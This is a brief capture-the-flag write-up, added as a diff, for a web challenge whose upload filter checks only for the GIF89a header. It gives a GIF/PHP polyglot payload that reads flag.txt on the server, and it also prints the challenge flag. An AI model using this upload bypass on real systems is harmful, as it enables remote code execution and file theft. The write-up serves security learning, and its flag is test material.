@@ -1,0 +1,5 @@
+This one was rather easy, the file validation only checks if the file starts with GIF89a so as long as we create a file that starts with that string it should work
+
+i used GIF89a <?php echo file_get_contents("flag.txt"); ?>
+
+WEBSEC{BypassingImageChecksToRCE}
